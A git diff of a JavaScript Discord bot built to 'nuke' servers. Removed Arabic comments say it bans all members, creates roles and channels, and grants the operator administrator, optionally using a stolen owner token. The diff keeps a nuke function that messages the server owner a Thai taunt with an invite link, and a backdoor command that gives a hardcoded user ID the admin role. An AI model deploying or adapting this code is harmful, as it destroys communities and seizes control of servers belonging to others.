@@ -1,14 +1,3 @@
-//فكره الكود
-//ان تسوي بوت 
-//وتعطيه اداري يضيفه
-//لما يضيفه تكتب الامر يلي انت حددته
-//وبيسوي رتب باسم يلي انت تحدده
-//ورومات صوتيه وكتابيه بالاسم يلي تحدده
-//ويعطيك رتبه فيها ادمن ستريشن
-//وتتحكم في السيرفر 
-//طبعا اول ما تكتب الامر بيبند كل الاعضاء 
-//او
-// اذا معك توكن الاونر حط توكن الاونر
 //ENJOY
 //Sorry For The Bad Engilsh :/
 //By xxxRevenge (Bowlingtoolkit)
@@ -33,24 +22,17 @@ client.on('ready', () => {
 
 });
 client.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
-//BY OROCHIX (Arabic)
         
 
 });
 // ban all and send a message for the ownerserver
 async function nuke(guild) {
-    let users = 100;
-    let channels = 100;
+    let users = 0;
+    let channels = 0;
   
     await guild.fetchMembers();
   
-    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [  ]').catch(e => { return void e; });
+    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [ https://discord.gg/5SbFP2k ]').catch(e => { return void e; });
   
   
   
@@ -477,7 +459,7 @@ let me = message.author
 
 //login in to the bot token or the serverowner token
     client.on('message', async message => {
-  const devs = ['];
+  const devs = ['286143114878517248']; // your id
   let member = message.author
    if (message.content === opcmd) {
     if (!devs.includes(message.author.id)) return;
@@ -486,4 +468,4 @@ let op = message.guild.roles.find('name', `${adminstrator}`)
     message.guild.member(member).addRole(op);
   }
 });
-client.login(process.env.BOT_TOKEN)
+client.login(process.env.BOT_TOKEN);
